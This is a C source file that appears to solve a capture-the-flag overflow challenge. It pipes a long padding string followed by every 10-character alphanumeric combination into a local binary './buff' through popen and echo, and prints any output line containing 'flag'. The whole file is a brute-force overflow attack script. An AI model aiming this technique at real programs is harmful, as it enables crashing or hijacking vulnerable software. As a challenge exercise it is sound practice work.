#include <stdio.h>
#include <stdlib.h>     
#include <string.h>

//global variables and magic numbers are the basis of good programming
const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
char buffer[50];
int i = 0;


void permute(int level) {
  const char* charset_ptr = charset;
  if (level == -1){
	  
	// setup command
	FILE *fp;
	char path[1035];
	char cmd[1000];	
	  
	snprintf(cmd, sizeof(cmd), "echo \"12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890%s\" | ./buff", buffer);      // linux "echo \"%s\" | ./buff"
	  
	  
	/* Open the command for reading. */
	fp = popen(cmd, "r");
	if (fp == NULL) {
		printf("Failed to run command\n" );
		exit(1);
	}

	/* Read the output a line at a time - output it. */
	while (fgets(path, sizeof(path), fp) != NULL) {
		if ( (strstr(path, "flag") != NULL) ) {
			printf("FLAG%s", path);
		}
	}
	
	/* keep track of progress */
	if (i == 10000) {
		printf("%s", buffer);
		i = 0;
	}
	i++;
	
	/* close */
	pclose(fp);
	memset(cmd, 0, sizeof(cmd));
	memset(path, 0, sizeof(path));
	
    //puts(buffer);
  } else {
    while(buffer[level] = *charset_ptr++) {
      permute(level - 1);
    }
  }
}

int main(int argc, char **argv)
{
  puts("HELLO");  
  int length = 10;

  //Must provide length (integer < sizeof(buffer)==50) as first arg;
  //It will crash and burn otherwise  

  buffer[length] = '\0';
  permute(length - 1);
  return 0;
}